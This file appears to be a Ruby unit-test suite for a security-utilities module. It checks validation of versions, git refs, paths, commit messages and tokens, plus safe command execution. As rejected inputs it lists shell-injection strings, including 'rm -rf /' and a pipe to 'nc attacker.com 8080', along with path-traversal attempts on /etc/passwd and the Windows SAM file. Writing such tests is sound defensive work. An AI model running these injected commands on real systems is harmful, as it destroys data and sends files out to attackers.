#!/usr/bin/env ruby
# test_security_utils.rb - Comprehensive tests for security utilities
#
# This test suite validates all security functions with both valid inputs
# and malicious attack vectors to ensure robust security.

require 'test/unit'
require 'tmpdir'
require 'stringio'
require_relative 'security_utils'

class TestSecurityUtils < Test::Unit::TestCase

  def setup
    @original_dir = Dir.pwd
    @test_dir = Dir.mktmpdir('security_test_')
    Dir.chdir(@test_dir)
  end

  def teardown
    Dir.chdir(@original_dir)
    FileUtils.rm_rf(@test_dir)
  end

  # Version validation tests
  def test_validate_version_valid
    valid_versions = [
      '1.0.0',
      '0.1.0',
      '10.20.30',
      '1.0.0-alpha',
      '1.0.0-alpha.1',
      '1.0.0+build.1',
      '1.0.0-alpha+build.1'
    ]

    valid_versions.each do |version|
      assert SecurityUtils.validate_version(version), "Should accept valid version: #{version}"
    end
  end

  def test_validate_version_invalid
    invalid_versions = [
      nil,
      '',
      'v1.0.0',           # No 'v' prefix
      '1.0',              # Missing patch
      '1.0.0.1',          # Too many parts
      '1.0.0-',           # Empty pre-release
      '1.0.0+',           # Empty build
      'abc.def.ghi',      # Non-numeric
      '1.0.0-alpha..1',   # Double dots
      'a' * 101,          # Too long
      "1.0.0\n",          # Newline
      "1.0.0\0"           # Null byte
    ]

    invalid_versions.each do |version|
      refute SecurityUtils.validate_version(version), "Should reject invalid version: #{version.inspect}"
    end
  end

  # Git reference validation tests
  def test_validate_git_ref_valid
    valid_refs = [
      'main',
      'feature/new-thing',
      'v1.0.0',
      'release-1.0',
      'heads/master',
      'refs/heads/main',
      'abc123def456',     # Commit hash
      'feature_branch'
    ]

    valid_refs.each do |ref|
      assert SecurityUtils.validate_git_ref(ref), "Should accept valid git ref: #{ref}"
    end
  end

  def test_validate_git_ref_invalid
    invalid_refs = [
      nil,
      '',
      '/main',            # Starts with /
      '-main',            # Starts with -
      'main.',            # Ends with .
      'feature..branch',  # Double dots
      'branch.lock',      # Ends with .lock
      "main\n",           # Newline
      "main\0",           # Null byte
      'a' * 251,          # Too long
      'main space'        # Space not allowed
    ]

    invalid_refs.each do |ref|
      refute SecurityUtils.validate_git_ref(ref), "Should reject invalid git ref: #{ref.inspect}"
    end
  end

  # File path validation tests
  def test_validate_file_path_valid
    valid_paths = [
      'file.txt',
      'dir/file.txt',
      'docs/tenets/simplicity.md',
      'tools/script.rb',
      'a/b/c/d/file.ext'
    ]

    valid_paths.each do |path|
      assert SecurityUtils.validate_file_path(path), "Should accept valid path: #{path}"
    end
  end

  def test_validate_file_path_invalid_traversal
    invalid_paths = [
      '/etc/passwd',      # Absolute path
      '../../../etc/passwd', # Directory traversal
      'dir/../../../etc/passwd', # Mixed traversal
      '..',               # Just parent dir
      '../file.txt',      # Starts with traversal
      'dir/../../../file', # Contains traversal
      "file\0.txt",       # Null byte
      "file\n.txt",       # Newline
      'a' * 1001         # Too long
    ]

    invalid_paths.each do |path|
      refute SecurityUtils.validate_file_path(path), "Should reject dangerous path: #{path.inspect}"
    end
  end

  # Commit message validation tests
  def test_validate_commit_message_valid
    valid_messages = [
      'feat: add new feature',
      "fix: resolve issue\n\nLonger description here",
      'docs: update README',
      'feat(auth): implement OAuth2 flow\n\nBREAKING CHANGE: API changed'
    ]

    valid_messages.each do |message|
      assert SecurityUtils.validate_commit_message(message), "Should accept valid commit: #{message[0..50]}..."
    end
  end

  def test_validate_commit_message_invalid
    invalid_messages = [
      nil,
      '',
      "message\0with\0nulls",    # Null bytes
      "message\x01with\x02control", # Control characters
      'a' * 10001                   # Too long
    ]

    invalid_messages.each do |message|
      refute SecurityUtils.validate_commit_message(message), "Should reject invalid commit: #{message.inspect}"
    end
  end

  # Output sanitization tests
  def test_sanitize_output
    assert_equal '', SecurityUtils.sanitize_output(nil)
    assert_equal '', SecurityUtils.sanitize_output('')
    assert_equal 'normal text', SecurityUtils.sanitize_output('normal text')
    assert_equal 'text with newlines', SecurityUtils.sanitize_output("text\nwith\nnewlines")
    assert_equal 'cleaned text', SecurityUtils.sanitize_output("cleaned\x00\x01text")
    assert_equal 'trimmed', SecurityUtils.sanitize_output('  trimmed  ')
  end

  # Safe system execution tests
  def test_safe_system_basic
    result = SecurityUtils.safe_system('echo', 'hello')
    assert result[:success]
    assert_equal 0, result[:exit_code]
  end

  def test_safe_system_failure
    result = SecurityUtils.safe_system('false')
    refute result[:success]
    assert_equal 1, result[:exit_code]
  end

  def test_safe_system_empty_command
    assert_raises(SecurityUtils::SecurityError) do
      SecurityUtils.safe_system()
    end
  end

  # Safe capture tests
  def test_safe_capture_success
    result = SecurityUtils.safe_capture('echo', 'hello world')
    assert result[:success]
    assert_equal 'hello world', result[:stdout].strip
    assert_equal '', result[:stderr]
    assert_equal 0, result[:exit_code]
  end

  def test_safe_capture_with_stderr
    result = SecurityUtils.safe_capture('sh', '-c', 'echo "error" >&2')
    assert result[:success]
    assert_equal '', result[:stdout]
    assert_equal 'error', result[:stderr].strip
  end

  def test_safe_capture_sanitizes_output
    # Create a script that outputs control characters
    script_content = "#!/bin/bash\nprintf 'hello\\x00\\x01world'\n"
    File.write('test_script.sh', script_content)
    system('chmod +x test_script.sh')

    result = SecurityUtils.safe_capture('./test_script.sh')
    assert_equal 'hello world', result[:stdout]  # Control chars replaced with spaces
  end

  # Git command safety tests
  def test_safe_git_command_valid
    # Skip if git not available
    return unless system('git --version > /dev/null 2>&1')

    result = SecurityUtils.safe_git_command('status', '--porcelain')
    assert result.is_a?(Hash)
    assert result.key?(:stdout)
    assert result.key?(:stderr)
    assert result.key?(:success)
  end

  def test_safe_git_command_invalid_command
    assert_raises(SecurityUtils::SecurityError) do
      SecurityUtils.safe_git_command('rm', '-rf', '/')
    end
  end

  def test_safe_git_command_dangerous_args
    assert_raises(SecurityUtils::SecurityError) do
      SecurityUtils.safe_git_command('status', '--porcelain; rm -rf /')
    end
  end

  # GitHub token validation tests
  def test_validate_github_token_valid
    valid_tokens = [
      'ghp_' + 'a' * 36,                    # Classic token
      'github_pat_' + 'a' * 82,             # Fine-grained token
      'ghs_' + 'a' * 36,                    # Server token
      'gho_' + 'a' * 36,                    # OAuth token
      'ghu_' + 'a' * 36                     # User token
    ]

    valid_tokens.each do |token|
      assert SecurityUtils.validate_github_token(token), "Should accept valid token format"
    end
  end

  def test_validate_github_token_invalid
    invalid_tokens = [
      nil,
      '',
      'not-a-token',
      'ghp_short',
      'ghp_' + 'a' * 35,   # Too short
      'ghp_' + 'a' * 37,   # Too long
      'fake_' + 'a' * 36   # Wrong prefix
    ]

    invalid_tokens.each do |token|
      refute SecurityUtils.validate_github_token(token), "Should reject invalid token"
    end
  end

  # Rate limiting tests
  def test_rate_limit_check
    key = 'test_api'

    # Should allow initial calls
    60.times do
      assert SecurityUtils.rate_limit_check(key, max_calls: 60, window: 3600)
    end

    # Should reject after limit
    assert_raises(SecurityUtils::SecurityError) do
      SecurityUtils.rate_limit_check(key, max_calls: 60, window: 3600)
    end
  end

  # File operation tests
  def test_safe_file_operations
    content = "test content\nline 2"
    path = 'test_file.txt'

    # Test write
    SecurityUtils.safe_file_write(path, content)
    assert File.exist?(path)

    # Test read
    read_content = SecurityUtils.safe_file_read(path)
    assert_equal content, read_content
  end

  def test_safe_file_write_dangerous_path
    assert_raises(SecurityUtils::SecurityError) do
      SecurityUtils.safe_file_write('../../../etc/passwd', 'malicious')
    end
  end

  def test_safe_file_read_nonexistent
    assert_raises(SecurityUtils::SecurityError) do
      SecurityUtils.safe_file_read('nonexistent.txt')
    end
  end

  def test_safe_file_operations_size_limits
    large_content = 'a' * 10_000_001  # Over 10MB limit

    assert_raises(SecurityUtils::SecurityError) do
      SecurityUtils.safe_file_write('large.txt', large_content)
    end
  end

  # Security logging tests
  def test_log_security_event
    # Enable logging for test
    original_env = ENV['SECURITY_LOGGING']
    ENV['SECURITY_LOGGING'] = 'true'

    # Capture output
    output = capture_output do
      SecurityUtils.log_security_event('test_event', { key: 'value' })
    end

    assert_includes output, '[SECURITY]'
    assert_includes output, 'test_event'
    assert_includes output, 'value'

    # Restore environment
    ENV['SECURITY_LOGGING'] = original_env
  end

  # Integration tests with real attack scenarios
  def test_shell_injection_prevention
    # These should all be safely handled
    dangerous_inputs = [
      'file.txt; rm -rf /',
      'file.txt && malicious_command',
      'file.txt | nc attacker.com 8080',
      'file.txt `malicious_command`',
      'file.txt $(rm -rf /)',
      "file.txt\nrm -rf /"
    ]

    dangerous_inputs.each do |input|
      refute SecurityUtils.validate_file_path(input), "Should reject shell injection: #{input}"
    end
  end

  def test_directory_traversal_prevention
    traversal_attempts = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      'valid/path/../../../etc/passwd',
      '....//....//....//etc/passwd',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'  # URL encoded
    ]

    traversal_attempts.each do |attempt|
      refute SecurityUtils.validate_file_path(attempt), "Should prevent traversal: #{attempt}"
    end
  end

  private

  def capture_output
    old_stdout = $stdout
    $stdout = StringIO.new
    yield
    $stdout.string
  ensure
    $stdout = old_stdout
  end

end
